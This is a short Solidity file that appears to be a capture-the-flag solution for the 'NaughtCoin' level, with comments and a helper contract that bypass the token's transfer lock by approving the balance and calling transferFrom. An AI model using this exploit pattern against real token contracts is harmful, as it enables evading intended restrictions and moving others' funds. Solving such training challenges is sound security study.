// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Solution:
// Before using transfer function approve the total balance to contract address below.
// Then call transferFrom through contract and balance will be wiped.

interface INaughtCoin {
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);
}

contract MyContract {

    INaughtCoin target;

    constructor(address _target) {
        target = INaughtCoin(_target);
    }

    function transfer(address _from, address _to, uint256 _value) external{
        require(target.transferFrom(_from,_to,_value),"Failed!");
    }
}
